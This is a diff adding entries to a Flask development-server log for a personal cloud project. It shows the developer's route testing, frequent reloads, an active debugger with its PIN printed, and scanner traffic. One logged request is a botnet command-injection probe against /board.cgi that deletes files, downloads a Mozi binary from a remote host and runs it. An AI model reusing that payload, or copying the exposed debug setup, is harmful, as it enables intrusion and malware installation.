@@ -6177,3 +6177,199 @@ INFO:root:Jimmy 0.238746
 INFO:werkzeug:211.23.46.114 - - [25/Oct/2021 02:28:10] "POST /identify HTTP/1.1" 200 -
 INFO:root:Call user_record.
 INFO:werkzeug:211.23.46.114 - - [25/Oct/2021 02:28:12] "POST /user_record HTTP/1.1" 200 -
+WARNING:werkzeug: * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+INFO:werkzeug: * Running on http://10.0.0.4:8080/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+WARNING:werkzeug: * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+INFO:werkzeug: * Running on http://10.0.0.4:8080/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:52:17] "GET /hello HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:53:44] "[33mGET /hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:53:51] "[33mGET /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:53:53] "[33mGET /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:18.205.189.60 - - [05/Nov/2021 02:55:10] "[33mGET /hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:55:57] "[33mGET /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:56:10] "[33mGET /hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:3.85.194.155 - - [05/Nov/2021 02:56:13] "[33mGET /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:56:17] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:56:34] "POST /get_login_user HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:56:53] "[33mPOST /api2 HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:56:59] "[33mPOST /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:57:00] "[33mPOST /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:58:34] "[33mPOST /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 02:58:34] "[33mPOST /api2/hello HTTP/1.1[0m" 404 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:00:32] "[31m[1mPOST /api2/hello HTTP/1.1[0m" 405 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:00:37] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:02:16] "[35m[1mGET /api2/hello HTTP/1.1[0m" 500 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:02:41] "[35m[1mGET /api2/hello HTTP/1.1[0m" 500 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+INFO:werkzeug: * Running on http://10.0.0.4:8080/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:54.213.129.252 - - [05/Nov/2021 03:10:38] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:42] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:43] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:45] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:45] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:46] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:46] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:10:46] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:54.69.83.165 - - [05/Nov/2021 03:13:17] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:30] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:33] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:34] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:36] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:37] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:38] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:39] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:13:53] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/sub_api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:14:25] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:18.207.225.74 - - [05/Nov/2021 03:14:27] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:14:28] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:14:31] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:14:33] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:14:39] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/model.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:17:26] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:17:28] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:17:31] "[35m[1mGET /add HTTP/1.1[0m" 500 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:17:48] "[35m[1mGET /add HTTP/1.1[0m" 500 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:09] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:10] "GET /add HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:12] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:13] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:14] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:14] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:18:18] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:3.92.196.63 - - [05/Nov/2021 03:18:26] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:19:26] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 03:19:26] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:38.88.252.189 - - [05/Nov/2021 03:35:44] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:38.88.252.187 - - [05/Nov/2021 03:36:23] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:20.55.53.144 - - [05/Nov/2021 03:56:51] "[33mGET /rRMmuwztlUSVC8Qps9W51kDABLw HTTP/1.1[0m" 404 -
+INFO:werkzeug:27.45.12.245 - - [05/Nov/2021 04:13:07] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://27.45.12.245:33487/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/0.9[0m" 404 -
+INFO:werkzeug:192.241.201.84 - - [05/Nov/2021 04:24:16] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+INFO:werkzeug:114.34.164.231 - - [05/Nov/2021 04:32:47] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.200.170 - - [05/Nov/2021 05:16:43] "[33mGET /hudson HTTP/1.1[0m" 404 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/model.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+INFO:werkzeug: * Running on http://10.0.0.4:8080/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:28:41] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:28:42] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:28:55] "[35m[1mGET /get_dict HTTP/1.1[0m" 500 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:19] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:24] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:28] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:28] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:29] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:32] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:33] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:34] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:29:34] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:00] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:01] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:02] "GET /get_dict HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:04] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:05] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:05] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:211.23.46.114 - - [05/Nov/2021 05:30:06] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug:3.81.73.132 - - [05/Nov/2021 05:30:08] "GET /api2/hello HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
+INFO:werkzeug:18.205.189.60 - - [05/Nov/2021 05:33:22] "[33mGET /get_dict HTTP/1.1[0m" 404 -
+INFO:werkzeug: * Detected change in '/home/pomchi/GCloudProjct/acount/api.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+INFO:werkzeug: * Running on http://10.0.0.4:8080/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 604-918-087
